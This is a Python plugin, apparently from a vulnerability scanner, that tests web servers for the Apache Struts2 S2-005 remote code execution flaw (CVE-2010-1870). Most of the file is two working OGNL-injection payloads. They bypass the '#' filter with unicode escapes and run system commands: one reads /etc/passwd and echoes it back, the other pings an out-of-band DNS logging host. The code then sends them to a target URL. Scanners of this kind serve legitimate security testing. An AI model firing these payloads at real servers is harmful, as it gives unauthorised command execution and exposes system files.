#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
import urllib3
import requests
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2010-1870" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2010-8-15'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability5"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞5' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\\u0023或者8进制\\43绕过。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "Struts2.0.0-Struts2.1.8.1"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


class UrlProcessing:  # URL处理函数
    def result(self, url):
        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
            res = urllib.parse.urlparse(url)
        else:
            res = urllib.parse.urlparse('http://%s' % url)
        return res.scheme, res.hostname, res.port,res.path

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies = Proxies().result(proxies)
    scheme, url, port ,path= UrlProcessing().result(Url)#这个系列的洞需要用到路径
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    DL=Dnslog()
    linux_payload ="?(%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003dfalse%27)(bla)(bla)&(%27%5cu0023_memberAccess.excludeProperties%5cu003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27%5cu0023_memberAccess.allowStaticMethodAccess%5cu003dtrue%27)(bla)(bla)&(%27%5cu0023mycmd%5cu003d%5c%27cat+/etc/passwd%5c%27%27)(bla)(bla)&(%27%5cu0023myret%5cu003d@java.lang.Runtime@getRuntime().exec(%5cu0023mycmd)%27)(bla)(bla)&(A)((%27%5cu0023mydat%5cu003dnew%5c40java.io.DataInputStream(%5cu0023myret.getInputStream())%27)(bla))&(B)((%27%5cu0023myres%5cu003dnew%5c40byte[51020]%27)(bla))&(C)((%27%5cu0023mydat.readFully(%5cu0023myres)%27)(bla))&(D)((%27%5cu0023mystr%5cu003dnew%5c40java.lang.String(%5cu0023myres)%27)(bla))&(%27%5cu0023myout%5cu003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27%5cu0023myout.getWriter().println(%5cu0023mystr)%27)(bla))"
    windows_payload="?(%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003dfalse%27)(bla)(bla)&(%27%5cu0023_memberAccess.excludeProperties%5cu003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27%5cu0023_memberAccess.allowStaticMethodAccess%5cu003dtrue%27)(bla)(bla)&(%27%5cu0023mycmd%5cu003d%5c%27ping+{}%5c%27%27)(bla)(bla)&(%27%5cu0023myret%5cu003d@java.lang.Runtime@getRuntime().exec(%5cu0023mycmd)%27)(bla)(bla)&(A)((%27%5cu0023mydat%5cu003dnew%5c40java.io.DataInputStream(%5cu0023myret.getInputStream())%27)(bla))&(B)((%27%5cu0023myres%5cu003dnew%5c40byte[51020]%27)(bla))&(C)((%27%5cu0023mydat.readFully(%5cu0023myres)%27)(bla))&(D)((%27%5cu0023mystr%5cu003dnew%5c40java.lang.String(%5cu0023myres)%27)(bla))&(%27%5cu0023myout%5cu003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27%5cu0023myout.getWriter().println(%5cu0023mystr)%27)(bla))".format(DL.dns_host())

    for payload in [linux_payload,windows_payload]:
        try:
            payload_url = scheme + "://" + url + ":" + str(port) + path + payload
            headers = {
                'User-Agent': RandomAgent,
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
            }
            resp=requests.get(payload_url,headers=headers, proxies=proxies,timeout=5, verify=False)
            code=resp.status_code
            con=resp.text
            if (code == 200 and con.find('root:')!=-1 and con.find('/bin/bash')!=-1 and con.find('bin:')!=-1) or DL.result():
                Medusa = "{} 存在Struts2远程代码执行漏洞(S2-005)\r\n漏洞详情:\r\n影响版本:2.0.0-2.1.8.1\r\nPayload:{}\r\n返回执行内容:{}\r\n".format(url, payload_url,con)
                _t = VulnerabilityInfo(Medusa)
                VulnerabilityDetails(_t.info, url, **kwargs).Write()  # 传入url和扫描到的数据
                WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
        except Exception as e:
            _ = VulnerabilityInfo('').info.get('algroup')
            ErrorHandling().Outlier(e, _)
            ErrorLog().Write("Plugin Name:" + _ + " || Target Url:" + url,e)  # 调用写入类传入URL和错误插件名og().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

